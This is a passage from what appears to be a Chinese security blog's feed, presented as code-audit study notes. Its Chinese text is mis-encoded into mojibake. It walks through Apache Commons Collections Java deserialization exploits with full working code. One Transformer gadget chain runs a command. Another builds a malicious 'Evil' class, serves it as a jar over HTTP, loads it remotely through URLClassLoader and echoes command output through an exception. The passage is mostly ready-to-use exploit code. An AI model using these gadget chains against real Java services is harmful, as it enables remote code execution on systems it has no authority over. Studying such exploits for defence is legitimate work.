comment">//é€šè¿‡å†…ç½®çš„ConstantTransformeræ¥è·å–Runtimeç±»</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token comment">//é€šè¿‡InvokerTransformeræ¥åå°„è°ƒç”¨getMethodæ–¹æ³•ï¼Œå‚æ•°æ˜¯getRuntimeï¼Œå…¶åç±»ä¼¼</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"open -a Calculator"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> transformChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//æ™®é€šçš„Map</span>        <span class="token class-name">Map</span> mp<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mp<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sw"</span><span class="token punctuation">,</span> <span class="token string">"demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// å°†æ™®é€šçš„Mapå˜æˆTransformedMapï¼Œå¹¶ä¸”æŒ‡å®šå˜æ¢æ–¹å¼ä¸ºå‰é¢å®šä¹‰çš„æ¶æ„chain</span>        <span class="token class-name">Map</span> transformMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>mp<span class="token punctuation">,</span> transformChain<span class="token punctuation">,</span> transformChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// ä¿®æ”¹TransformedMapä¸­çš„ä¸€ä¸ªå€¼ï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤</span>        <span class="token class-name">Map<span class="token punctuation">.</span>Entry</span> entry<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token punctuation">)</span> transformMap<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        entry<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„ç¬¬ 25 è¡Œæˆ‘æ‰§è¡Œçš„å‘½ä»¤æ˜¯ open -a Calculatorï¼Œè¿™é‡Œæ˜¯ Mac ä¸‹æ‰“å¼€è®¡ç®—æœºçš„å‘½ä»¤ï¼Œå¦‚æœåœ¨ Windows ä¸‹åˆ™éœ€è¦ä¿®æ”¹æˆå¯¹åº”å‘½ä»¤ã€‚</p><p>è¿è¡Œä¸€ä¸‹ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111211543622.png"></p><p>è¿™é‡Œåªæ˜¯å®ç°äº†æ— å›æ˜¾çš„åˆ©ç”¨æ–¹å¼ï¼Œæ¥ä¸‹æ¥å°±åˆ©ç”¨ä»£ç æ³¨å…¥å®ç°æœ‰å›æ˜¾çš„åˆ©ç”¨ã€‚</p><h3 id="æœ‰å›æ˜¾åˆ©ç”¨"><a href="#æœ‰å›æ˜¾åˆ©ç”¨" class="headerlink" title="æœ‰å›æ˜¾åˆ©ç”¨"></a>æœ‰å›æ˜¾åˆ©ç”¨</h3><p>è¿™é‡Œæœ‰å›æ˜¾åˆ©ç”¨çš„æ–¹å¼æ˜¯ä½¿ç”¨ java.net.URLClassLoader è¿œç¨‹åŠ è½½è‡ªå®šä¹‰æ¶æ„ç±»ï¼Œä¹Ÿå°±æ˜¯è‡ªå·±æ”¾åœ¨æœåŠ¡å™¨ä¸Šçš„ jar åŒ…ï¼Œç„¶ååœ¨æŠ›å‡ºçš„å¼‚å¸¸ä¿¡æ¯ä¸­è·å¾—å›æ˜¾ç»“æœã€‚</p><p>å› æ­¤è¿™é‡Œé¦–å…ˆéœ€è¦å…ˆå†™ä¸€ä¸ªæ¶æ„ç±»ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">BufferedReader</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStreamReader</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Exec</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Process</span> proc <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BufferedReader</span> br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>proc<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuffer</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> line<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> br<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span> result <span class="token operator">=</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Exception</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">throw</span> e<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°†æ¶æ„ç±»æ‰“åŒ…æˆ jar æ–‡ä»¶ï¼Œå¹¶æ”¾åˆ°æœåŠ¡å™¨ä¸Šï¼Œè¿™é‡Œå› ä¸ºæ˜¯æœ¬åœ°æ¼”ç¤ºï¼Œå°±ç›´æ¥åœ¨æœ¬åœ°å¼€ä¸ª Python HTTP æœåŠ¡äº†ã€‚</p><pre class="line-numbers language-none"><code class="language-none">javac Evil.javajar -cvf Evil.jar Evil.classpython3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> ç„¶åå›åˆ° intelliJ IDEAï¼Œåœ¨ com.commons è½¯ä»¶åŒ…ä¸­æ–°å»º ApacheCommonsCollectionsDemo2.java æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­å†™å…¥ä»¥ä¸‹å†…å®¹</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>commons</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ApacheCommonsCollectionsDemo2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URLClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getConstructor"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newInstance"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span><span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"http://127.0.0.1/Evil.jar"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"loadClass"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"Evil"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"Exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"uname"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> entry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BadAttributeValueExpException</span> poc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> valfield <span class="token operator">=</span> poc<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        valfield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        valfield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>poc<span class="token punctuation">,</span> entry<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">File</span> f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"payload.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"payload.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæ‰§è¡Œçš„å‘½ä»¤æ˜¯ unameï¼Œè¿è¡Œä»£ç å¯ä»¥çœ‹åˆ°æŠ¥é”™ä¿¡æ¯é‡Œæ˜¾ç¤ºäº† Darwinï¼Œè¯´æ˜å‘½ä»¤è¢«æˆåŠŸæ‰§è¡Œäº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111211611336.png"></p><p>è¿™æ ·å°±åˆ©ç”¨ä»£ç æ³¨å…¥å®ç°äº† Apache Commons collections ååºåˆ—åŒ–æ¼æ´æœ‰å›æ˜¾çš„åˆ©ç”¨ã€‚</p><blockquote><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://www.freebuf.com/vuls/251664.html">https://www.freebuf.com/vuls/251664.html</a></p><p><a href="https://www.anquanke.com/post/id/224487">https://www.anquanke.com/post/id/224487</a></p><p><a href="https://blog.csdn.net/Candyys/article/details/106006282">https://blog.csdn.net/Candyys/article/details/106006282</a></p><p><a href="https://blog.csdn.net/java276582434/article/details/90550578">https://blog.csdn.net/java276582434/article/details/90550578</a></p><p>æ›´å¤šä¿¡æ¯æ¬¢è¿å…³æ³¨æˆ‘çš„ä¸ªäººå¾®ä¿¡å…¬ä¼—å·ï¼šTeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-å‘½ä»¤æ³¨å…¥&quot;&gt;&lt;a href=&quot;#0x01-å‘½ä»¤æ³¨å…¥&quot; class=&quot;headerlink&quot; title=&quot;0x01 å‘½ä»¤æ³¨å…¥&quot;&gt;&lt;/a&gt;0x01 å‘½ä»¤æ³¨å…¥&lt;/h1&gt;&lt;p&gt;åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå¼€å‘äººå‘˜å¯èƒ½éœ€è¦å¯¹ç³»ç»Ÿæ–‡ä»¶è¿›è¡Œç§»åŠ¨ã€åˆ é™¤æˆ–è€…æ‰§è¡Œä¸€äº›ç³»ç»Ÿå‘½ä»¤ï¼Œè¿™æ—¶å¦‚æœ</summary>
      
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="å­¦ä¹ ç¬”è®°" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ã€ä»£ç å®¡è®¡ã€‘SQL æ³¨å…¥</title>
    <link href="https://www.teamssix.com/211117-091653.html"/>
    <id>https://www.teamssix.com/211117-091653.html</id>
    <published>2021-11-17T01:16:53.000Z</published>
    <updated>2021-11-22T08:59:49.391Z</updated>
    
